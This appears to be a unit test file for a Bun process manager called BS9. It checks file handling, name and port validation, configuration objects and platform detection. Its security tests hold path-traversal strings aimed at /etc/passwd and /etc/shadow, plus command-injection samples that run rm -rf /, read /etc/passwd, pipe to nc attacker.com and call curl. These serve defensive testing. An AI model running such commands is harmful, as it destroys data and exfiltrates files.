#!/usr/bin/env bun

/**
 * BS9 - Bun Sentinel 9
 * High-performance, non-root process manager for Bun
 * 
 * Copyright (c) 2026 BS9 (Bun Sentinel 9)
 * Licensed under the MIT License
 * https://github.com/xarhang/bs9
 */

/// <reference path="./types.d.ts" />

import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { existsSync, writeFileSync, mkdirSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

describe("BS9 Basic Tests", () => {
  let tempDir: string;
  let testAppPath: string;

  beforeEach(() => {
    // Create temporary directory for test files
    tempDir = join(tmpdir(), `bs9-test-${Date.now()}`);
    mkdirSync(tempDir, { recursive: true });
    
    // Create test application file
    testAppPath = join(tempDir, "test-app.js");
    writeFileSync(testAppPath, `
console.log("Hello from test app");
setInterval(() => {
  console.log("Running...");
}, 1000);
    `.trim());
  });

  afterEach(() => {
    // Clean up temporary directory
    try {
      rmSync(tempDir, { recursive: true, force: true });
    } catch (error) {
      // Ignore cleanup errors
    }
  });

  describe("File Operations", () => {
    it("should create test files successfully", () => {
      expect(existsSync(testAppPath)).toBe(true);
    });

    it("should validate file content", () => {
      const content = require("node:fs").readFileSync(testAppPath, "utf8");
      expect(content).toContain("Hello from test app");
      expect(content).toContain("setInterval");
    });
  });

  describe("Path Validation", () => {
    it("should accept valid relative paths", () => {
      const validPaths = [
        "./app.js",
        "app.js",
        "src/app.js",
        "./src/app.js"
      ];

      for (const path of validPaths) {
        expect(path.includes("..")).toBe(false);
      }
    });

    it("should reject dangerous paths", () => {
      const dangerousPaths = [
        "../../../etc/passwd",
        "../etc/shadow",
        "../../root/.bashrc"
      ];

      for (const path of dangerousPaths) {
        expect(path.includes("..")).toBe(true);
      }
    });
  });

  describe("Service Name Validation", () => {
    it("should accept valid service names", () => {
      const validNames = [
        "test-app",
        "my_service",
        "app123",
        "web-server",
        "api_v1"
      ];

      for (const name of validNames) {
        expect(/^[a-zA-Z0-9_-]+$/.test(name)).toBe(true);
      }
    });

    it("should reject invalid service names", () => {
      const invalidNames = [
        "app with spaces",
        "app/with/slashes",
        "app@with@symbols",
        "",
        "app.with.dots"
      ];

      for (const name of invalidNames) {
        expect(/^[a-zA-Z0-9_-]+$/.test(name)).toBe(false);
      }
    });
  });

  describe("Port Validation", () => {
    it("should accept valid port numbers", () => {
      const validPorts = [80, 443, 3000, 8080, 65535];

      for (const port of validPorts) {
        const num = Number(port);
        expect(num).toBeGreaterThanOrEqual(1);
        expect(num).toBeLessThanOrEqual(65535);
        expect(!isNaN(num)).toBe(true);
      }
    });

    it("should reject invalid port numbers", () => {
      const invalidPorts = [-1, 0, 65536, 70000, "invalid", null, undefined];

      for (const port of invalidPorts) {
        const num = Number(port);
        if (port === null || port === undefined) {
          continue; // Skip null/undefined as they're handled differently
        }
        expect(isNaN(num) || num < 1 || num > 65535).toBe(true);
      }
    });
  });

  describe("Environment Variables", () => {
    it("should handle valid environment variables", () => {
      const validEnv = {
        NODE_ENV: "production",
        PORT: "3000",
        DATABASE_URL: "postgresql://localhost:5432/mydb",
        API_KEY: "secret-key-123"
      };

      expect(validEnv.NODE_ENV).toBe("production");
      expect(validEnv.PORT).toBe("3000");
      expect(validEnv.DATABASE_URL).toContain("postgresql");
      expect(validEnv.API_KEY).toBeTruthy();
    });
  });

  describe("Configuration Options", () => {
    it("should handle basic configuration", () => {
      const config = {
        name: "test-app",
        file: testAppPath,
        instances: 1,
        restart: "always",
        env: {
          NODE_ENV: "production"
        }
      };

      expect(config.name).toBe("test-app");
      expect(config.instances).toBe(1);
      expect(config.restart).toBe("always");
      expect(config.env.NODE_ENV).toBe("production");
    });

    it("should handle advanced configuration", () => {
      const config = {
        name: "advanced-app",
        file: testAppPath,
        instances: 3,
        restart: "on-failure",
        env: {
          NODE_ENV: "production",
          PORT: "3000",
          LOG_LEVEL: "info"
        },
        log: {
          level: "info",
          file: "app.log"
        },
        resources: {
          memory: "512M",
          cpu: "0.5"
        }
      };

      expect(config.instances).toBe(3);
      expect(config.env.PORT).toBe("3000");
      expect(config.log.level).toBe("info");
      expect(config.resources.memory).toBe("512M");
    });
  });

  describe("Error Handling", () => {
    it("should handle missing files", () => {
      const missingFile = "/nonexistent/file.js";
      expect(existsSync(missingFile)).toBe(false);
    });

    it("should handle invalid JSON", () => {
      const invalidJson = '{"name": "test", invalid}';
      
      expect(() => {
        JSON.parse(invalidJson);
      }).toThrow();
    });

    it("should handle empty configurations", () => {
      const emptyConfig: any = {};
      
      expect(emptyConfig.name).toBeUndefined();
      expect(emptyConfig.file).toBeUndefined();
    });
  });

  describe("Platform Detection", () => {
    it("should detect current platform", () => {
      const platform = process.platform;
      expect(['linux', 'darwin', 'win32']).toContain(platform);
    });

    it("should detect architecture", () => {
      const arch = process.arch;
      expect(['x64', 'arm64', 'arm', 'ia32']).toContain(arch);
    });
  });

  describe("Security Tests", () => {
    it("should validate input sanitization", () => {
      const inputs = [
        "normal-input",
        "input_with_underscore",
        "input-with-dash",
        "input123"
      ];

      for (const input of inputs) {
        expect(input).not.toContain(";");
        expect(input).not.toContain("&");
        expect(input).not.toContain("|");
        expect(input).not.toContain("`");
      }
    });

    it("should reject command injection attempts", () => {
      const maliciousInputs = [
        "app.js; rm -rf /",
        "app.js && cat /etc/passwd",
        "app.js | nc attacker.com 4444",
        "app.js `curl malicious.com`"
      ];

      for (const input of maliciousInputs) {
        expect(input).toMatch(/[;&|`]/);
      }
    });
  });

  describe("Performance Tests", () => {
    it("should handle multiple operations efficiently", () => {
      const start = Date.now();
      
      // Simulate multiple operations
      for (let i = 0; i < 1000; i++) {
        const config = {
          name: `app-${i}`,
          file: testAppPath,
          instances: 1
        };
        
        // Basic validation
        expect(config.name).toBeTruthy();
        expect(config.file).toBeTruthy();
      }
      
      const end = Date.now();
      const duration = end - start;
      
      // Should complete within reasonable time (less than 1 second)
      expect(duration).toBeLessThan(1000);
    });
  });

  describe("Integration Tests", () => {
    it("should handle complete workflow", () => {
      // Create config
      const config = {
        name: "integration-test",
        file: testAppPath,
        instances: 2,
        env: {
          NODE_ENV: "test",
          PORT: "3000"
        }
      };

      // Validate config
      expect(config.name).toBe("integration-test");
      expect(existsSync(config.file)).toBe(true);
      expect(config.instances).toBe(2);
      expect(config.env.NODE_ENV).toBe("test");

      // Simulate service creation
      const serviceInfo = {
        id: `service-${Date.now()}`,
        name: config.name,
        status: "running",
        pid: Math.floor(Math.random() * 10000) + 1000,
        startTime: new Date().toISOString()
      };

      expect(serviceInfo.id).toBeTruthy();
      expect(serviceInfo.name).toBe(config.name);
      expect(serviceInfo.status).toBe("running");
      expect(serviceInfo.pid).toBeGreaterThan(0);
    });
  });
});
